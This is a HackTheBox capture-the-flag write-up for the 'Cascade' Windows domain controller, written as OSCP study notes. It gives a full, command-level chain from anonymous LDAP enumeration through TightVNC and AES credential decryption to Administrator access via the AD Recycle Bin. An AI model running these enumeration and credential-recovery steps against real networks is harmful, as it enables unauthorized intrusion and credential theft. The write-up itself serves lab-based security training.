# Cascade - HackTheBox Writeup

**OS:** Windows (Server 2008 R2, Domain Controller)
**Difficulty:** Medium
**Topics:** Null Session Enumeration, enum4linux, Anonymous LDAP Bind, Custom LDAP Attribute Looting (`cascadeLegacyPwd`), Base64-Encoded Credential Recovery, SMB Share Looting, TightVNC Stored-Password Recovery (fixed-key DES), .NET Decompilation (ilspycmd), AES-CBC Credential Decryption, SQLite Looting, AD Recycle Bin / Deleted-Object Recovery, evil-winrm

> **Status:** Complete chain to **root**. Foothold via anonymous LDAP (`cascadeLegacyPwd`) -> loot `Data` share -> recover `s.smith` from a stored TightVNC blob -> loot `Audit$`, decompile its .NET tool and AES-decrypt the DB to get `arksvc` -> abuse `arksvc`'s AD Recycle Bin rights to recover the deleted `TempAdmin` (= Administrator) password.

---

## Enumeration

```bash
nmap -sC -sV -v 10.129.84.52
```

Relevant ports:
- **53** - DNS (Microsoft DNS 6.1.7601, Server 2008 R2 SP1)
- **88** - Kerberos (`server time` confirms it's a DC)
- **135/139/445** - RPC / NetBIOS / SMB
- **389/3268** - LDAP + Global Catalog, `Domain: cascade.local, Site: Default-First-Site-Name`
- **636/3269** - LDAPS (tcpwrapped)
- **5985** - WinRM (Microsoft HTTPAPI 2.0)
- **49154+** - high RPC ports

Host info: `Host: CASC-DC1; OS: Windows Server 2008 R2 SP1`.

SMB signing from the host script results:

```
smb2-security-mode: Message signing enabled and required
```

> The old OS (2008 R2) plus `cascade.local` on 389/3268 flags this as a classic AD box. Signing being *required* on SMB is a note for later (rules out some relay paths) - but it does **not** stop anonymous LDAP reads, which is where this box opens up.

### Null session user enumeration

```bash
enum4linux -U 10.129.84.52
```

The null session is allowed (`Server ... allows sessions using username '', password ''`), confirming the host is domain-joined:

```
Domain Name: CASCADE
Domain Sid: S-1-5-21-3332504370-1206983947-1165150453
```

...and it dumps the full domain user list for free:

```
arksvc        (ArkSvc)
s.smith       (Steve Smith)
r.thompson    (Ryan Thompson)
util          (Util)
j.wakefield   (James Wakefield)
s.hickson     (Stephanie Hickson)
j.goodhand    (John Goodhand)
a.turnbull    (Adrian Turnbull)
e.crowe       (Edward Crowe)
b.hanson      (Ben Hanson)
d.burman      (David Burman)
BackupSvc     (BackupSvc)
j.allen       (Joseph Allen)
i.croft       (Ian Croft)
CascGuest
```

Extract usernames into a wordlist for later:

```bash
grep -oP '(?<=Account: )\S+' enum4linux_output.txt > users.txt
```

> Two service accounts stand out immediately by name: `arksvc` and `BackupSvc`. "Ark" + "Backup" on a DC hints at backup/recycle-bin tooling - worth remembering.

---

## Foothold - Anonymous LDAP -> `cascadeLegacyPwd`

The same anonymous access that enum4linux used over SMB usually also means an **anonymous LDAP bind** works. enum4linux only shows standard SAM attributes; LDAP exposes *every* attribute on every object - including non-standard ones.

### Dump the directory over an anonymous bind

```bash
ldapsearch -x -H ldap://10.129.84.52 -b "DC=cascade,DC=local" -s sub "(objectClass=user)" | grep -i "cascade\|pwd\|legacy"
```

* `-x` - simple bind; with no `-D`/`-w` this is an **anonymous** bind
* `-H ldap://10.129.84.52` - the DC
* `-b "DC=cascade,DC=local"` - base DN, derived mechanically from the `cascade.local` domain (nmap/enum4linux)
* `-s sub` - subtree scope: recurse the whole tree under the base
* `"(objectClass=user)"` - filter to user objects only
* The `grep` is just post-filtering the wall of output to surface password-ish attribute names

> **Method note:** the `grep` keywords (`pwd`, `legacy`, `cascade`) are not something you know up front - they come *after* reading the raw dump once and noticing an attribute that doesn't belong to standard AD. The honest workflow is: dump everything to a file first (`ldapsearch ... > ldap_dump.txt`), read it, spot the anomaly, *then* grep for it.

The anomaly is on **Ryan Thompson**:

```
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
userPrincipalName: r.thompson@cascade.local
cascadeLegacyPwd: clk0bjVldmE=
```

`cascadeLegacyPwd` is **not** a standard Active Directory attribute - someone extended the schema (named after the org, "cascade") to stash a legacy password. Any non-standard attribute on a user object deserves immediate attention precisely because it was added on purpose.

### Targeted variant (filter instead of grep)

Once you *know* the attribute exists, the cleaner way to pull it (and find any other object carrying it) is the `=*` ("attribute present") filter, rather than dumping everything and grepping:

```bash
ldapsearch -x -H ldap://10.129.84.52 -b "DC=cascade,DC=local" "(cascadeLegacyPwd=*)" cascadeLegacyPwd sAMAccountName
```

* `(cascadeLegacyPwd=*)` - return only objects that **have** this attribute
* Trailing `cascadeLegacyPwd sAMAccountName` - request only those two attributes, cutting the noise

> This filter was *not* run live in this session - it's the natural follow-up to the grep above, and its result is already contained in the full dump.

### Decode the value

The value is Base64:

```bash
echo "clk0bjVldmE=" | base64 -d
```

-> `rY4n5eva` - `r.thompson`'s cleartext password. No bruteforce, no lockout risk - the credential was sitting in the directory readable by an anonymous bind.

### Why not bruteforce?

The obvious-but-wrong instinct here is to bruteforce `r.thompson` over SMB with rockyou. On a **domain controller** that triggers the account lockout policy within a few attempts, locks the account, and gets you nothing. Online bruteforce against AD is an anti-pattern; a controlled **password spray** (one password across all users) is the only online-guessing move that's ever appropriate - and here it isn't needed at all, because LDAP handed over the credential.

### Verify the credential

```bash
nxc smb 10.129.84.52 -u 'r.thompson' -p 'rY4n5eva'
```

A `[+]` confirms the foothold.

### Enumerate shares as `r.thompson`

```bash
smbclient -L //10.129.84.52 -U 'cascade.local\r.thompson%rY4n5eva'
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
Audit$          Disk
C$              Disk      Default share
Data            Disk
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
print$          Disk      Printer Drivers
SYSVOL          Disk      Logon server share
```

* The default/administrative shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `print$`, `SYSVOL`) are noise. The two **non-standard** shares - `Data` and `Audit$` - are the ones to chase.
* `r.thompson` is in `IT` but **not** in `Remote Management Users`, so direct WinRM as this user is expected to fail - these creds are for reading shares, not for a shell.
* The `Reconnecting with SMB1 ... NT_STATUS_RESOURCE_NAME_NOT_FOUND` line at the end is just `smbclient`'s legacy SMB1 workgroup-listing fallback failing - **cosmetic**, the share list above already came back over SMB2/3.

---

## Looting the `Data` share -> `s.smith`

With `r.thompson`'s credentials, connect to the non-standard `Data` share and pull it down recursively instead of browsing file by file:

```bash
smbclient //10.129.84.52/Data -U 'cascade.local\r.thompson%rY4n5eva' -c 'recurse ON; prompt OFF; mget *'
```

The useful material lives under an `IT/` tree:

```
IT/Email Archives/Meeting_Notes_June_2018.html
IT/Temp/s.smith/VNC Install.reg
```

Once it's on disk, grep the whole dump for anything credential-ish rather than opening files one at a time:

```bash
grep -rni "password" ~/htb/cascade 2>/dev/null
```

Two hits matter.

**1. `Meeting_Notes_June_2018.html`** - references a temporary account whose password matches the real admin's:

```
Username is TempAdmin (password is the same as the normal admin account password)
```

> This is a breadcrumb for the **final** root step, not for now. It tells you that recovering `TempAdmin`'s password later - it's a *deleted* object sitting in the AD Recycle Bin - hands you the Administrator password. Park it and keep moving.

**2. `VNC Install.reg`** - a TightVNC server config exported to the registry, carrying a stored password:

```
[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"UseVncAuthentication"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

### Recovering the TightVNC password

VNC does **not** hash its stored password - it DES-encrypts it with a **fixed, publicly known key** (`e84ad660c4721ae0`). This is obfuscation, not encryption you can't reverse: anyone who reads the blob recovers the cleartext. Strip the commas from the hex and decrypt it:

```bash
python3 -c '
from Crypto.Cipher import DES
enc = bytes.fromhex("6bcf2a4b6e5aca0f")      # the "Password"=hex bytes, commas removed
key = bytes.fromhex("e84ad660c4721ae0")      # VNC fixed DES key
print(DES.new(key, DES.MODE_ECB).decrypt(enc))
'
# -> b'sT333ve2'
```

`pip install pycryptodome` first if the `Crypto` module is missing. Or use the dedicated tool:

```bash
git clone https://github.com/jeroennijhof/vncpwd && (cd vncpwd && make)
echo -n -e '\x6b\xcf\x2a\x4b\x6e\x5a\xca\x0f' > vncpass.bin
./vncpwd/vncpwd vncpass.bin
```

Either route gives the password: **`sT333ve2`**.

### Shell as `s.smith`

Unlike `r.thompson`, `s.smith` **is** a member of `Remote Management Users`, so WinRM works directly for this account:

```bash
evil-winrm -i 10.129.84.52 -u s.smith -p 'sT333ve2'
```

```powershell
type C:\Users\s.smith\Desktop\user.txt
```

User flag captured.

---

## Looting `Audit$` -> `arksvc`

`s.smith` (unlike `r.thompson`) can read the second non-standard share, `Audit$`. Pull it recursively:

```bash
smbclient //10.129.84.52/Audit$ -U 'cascade.local\s.smith%sT333ve2' -c 'recurse ON; prompt OFF; mget *'
```

Contents - a custom .NET auditing tool plus its SQLite database:

```
CascAudit.exe
CascCrypto.dll
RunAudit.bat
System.Data.SQLite.dll
System.Data.SQLite.EF6.dll
DB/Audit.db
```

### Read the database

```bash
sqlite3 Audit.db
sqlite> .tables
sqlite> SELECT * FROM Ldap;
```

```
ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

The password column is Base64, but decoding it gives 16 bytes of **binary** - a single AES block, not cleartext. The tool decrypts it at runtime, so the key must be inside the binary.

### Decompile to recover key + IV

The two `.dll`/`.exe` are .NET assemblies - decompile with `ilspycmd` (or ILSpy/dnSpy/dotPeek GUI):

```bash
ilspycmd CascCrypto.dll > CascCrypto.cs
ilspycmd CascAudit.exe  > CascAudit.cs
```

> **Version note:** the latest `ilspycmd` needs .NET 10. On .NET 6, pin an older build: `dotnet tool install -g ilspycmd --version 8.0.0.7345`. If you only need the hardcoded strings and don't want to decompile at all, `strings -el CascCrypto.dll` dumps the UTF-16 literals (the key and IV show up directly).

- `CascCrypto.dll` -> `DecryptString(string, string)`: **AES-128-CBC**, with a constant **`IV = 1tdyjCbY1Ix49842`** (`DefaultIV`); key and IV are turned into bytes with `Encoding.UTF8.GetBytes`.
- `CascAudit.exe` -> `Main` calls `Crypto.DecryptString(encryptedString, "c4scadek3y654321")`, so the **key = `c4scadek3y654321`**.

### Decrypt the credential

```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = b"c4scadek3y654321"
iv  = b"1tdyjCbY1Ix49842"
enc = base64.b64decode("BQO5l5Kj9MdErXx6Q6AGOw==")
print(unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(enc), 16).decode())
# -> w3lc0meFr31nd
```

The raw block is `b'w3lc0meFr31nd\x03\x03\x03'` - PKCS7 padding, so `unpad` (or `rstrip` the pad bytes) gives `arksvc`'s password: **`w3lc0meFr31nd`**.

### Shell as `arksvc`

```bash
evil-winrm -i 10.129.84.52 -u arksvc -p 'w3lc0meFr31nd'
```

```powershell
whoami /groups
```

Confirms membership of **`CASCADE\AD Recycle Bin`** - exactly the group needed for the final step.

---

## Privilege Escalation - AD Recycle Bin -> `TempAdmin` -> root

`arksvc`'s `AD Recycle Bin` membership lets it read **deleted** AD objects, which ordinary users can't. The Meeting Notes breadcrumb from the `Data` share said a `TempAdmin` account shared the real Administrator's password - and `TempAdmin` was deleted, so it's sitting in the recycle bin.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -IncludeDeletedObjects -Properties * |
  Select-Object name, cascadeLegacyPwd
```

```
name       cascadeLegacyPwd
----       ----------------
TempAdmin  YmFDVDNyMWFOMDBkbGVz
```

Same `cascadeLegacyPwd` legacy-password attribute as the foothold, same Base64 trick:

```bash
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
# -> baCT3r1aN00dles
```

### Shell as Administrator

Per the Meeting Notes, `TempAdmin`'s password **is** the Administrator password:

```bash
evil-winrm -i 10.129.84.52 -u administrator -p 'baCT3r1aN00dles'
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

Box rooted.

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| Recon | TCP scan, AD/DC fingerprinting | nmap |
| Null session | Dump domain users + SID | enum4linux |
| Wordlist | Extract usernames | grep |
| LDAP enum | Anonymous bind, dump user objects | ldapsearch |
| Loot | Spot non-standard `cascadeLegacyPwd` attribute on `r.thompson` | ldapsearch + grep |
| Foothold | Base64-decode the stored password (`rY4n5eva`) | base64 |
| Verify | Confirm creds over SMB | NetExec (nxc) |
| Share enum | List shares; spot non-standard `Data` + `Audit$` | smbclient |
| Loot | Recursively download `Data`, grep the dump for secrets | smbclient + grep |
| Cred recovery | Decrypt stored TightVNC password (fixed-key DES) | pycryptodome / vncpwd |
| User shell | WinRM as `s.smith` -> user flag | evil-winrm |
| Loot | Read `Audit$` SQLite DB (`Ldap` table) | smbclient + sqlite3 |
| Reversing | Decompile .NET tool for hardcoded AES key + IV | ilspycmd / strings |
| Cred recovery | AES-128-CBC decrypt `arksvc` password | pycryptodome |
| Privesc | Recover deleted `TempAdmin` from AD Recycle Bin | Get-ADObject + base64 |
| Root | WinRM as Administrator -> root flag | evil-winrm |

---

## OSCP Notes

- **Null SMB session ⇒ try anonymous LDAP next.** They're the same anonymous access on different services. enum4linux shows standard SAM fields; `ldapsearch -x` over 389 shows *every* attribute, which is where secrets in custom fields live.
- **Any non-standard LDAP attribute is a loud signal.** Standard AD attributes you learn to recognize (`sAMAccountName`, `memberOf`, `pwdLastSet`, ...). A name like `cascadeLegacyPwd`, `ms-Mcs-AdmPwd` (LAPS), `userPassword`, or a password dumped into `info`/`description` means someone deliberately put something there - and it's rarely harmless.
- **Dump first, filter second.** You don't magically know to grep for `cascadeLegacyPwd`; you dump the whole directory to a file, read it, notice the oddity, then write a targeted `(attr=*)` filter to pull it cleanly.
- **Base64 is not encryption.** A `=`-padded string in a password-ish field is almost always Base64 - `base64 -d` it before assuming it's a hash.
- **Don't online-bruteforce AD accounts.** A DC has a lockout policy; rockyou against one user locks it fast. If you must guess online, *spray* (one password, many users) and check `getdompwinfo` first. Here, LDAP made guessing unnecessary entirely.
- **Stored VNC passwords are reversible, not hashed.** TightVNC/RealVNC/UltraVNC store the server password DES-encrypted under a *fixed* key (`e84ad660c4721ae0`). A `"Password"=hex:...` under an `HKLM\...\VNC` key - or an 8-byte blob in a `.reg`/`.ini`/`.vnc` file - is instantly recoverable with `vncpwd` or an 8-line DES decrypt. Same lesson as Base64: obfuscation is not encryption you can't reverse.
- **After downloading a share, grep it - don't browse it.** `grep -rniE "pass|pwd|secret|cred" <loot_dir>` surfaces credentials across notes, configs, scripts and exported registry files in a single pass, far faster than opening files by hand.
- **Not every secret is for right now.** The Meeting Notes `TempAdmin` hint is useless at foothold and decisive at root. Note breadcrumbs, map each to the account it unlocks, and come back to it when you're in range.
- **A Base64 blob that decodes to binary is a cipher block, not a password.** `BQO5l5Kj9MdErXx6Q6AGOw==` decodes to exactly 16 bytes - one AES block. That length is the tell: the cleartext is encrypted, and whatever decrypts it (key + IV) is almost always hardcoded in the tool shipped next to the DB.
- **Custom .NET tools carry their own keys - decompile them.** `.exe`/`.dll` found on a share are readable source: `ilspycmd` (or ILSpy/dnSpy) reveals hardcoded AES keys, IVs and connection strings. When you only need the constants, `strings -el` (UTF-16) often dumps the key and IV without decompiling at all.
- **`AD Recycle Bin` membership = read deleted objects.** Deleted AD objects keep their attributes (including custom ones like `cascadeLegacyPwd`) until purged. `Get-ADObject -IncludeDeletedObjects -Properties *` from a member of that group is a standard privesc - always enumerate the recycle bin when you land on such an account.
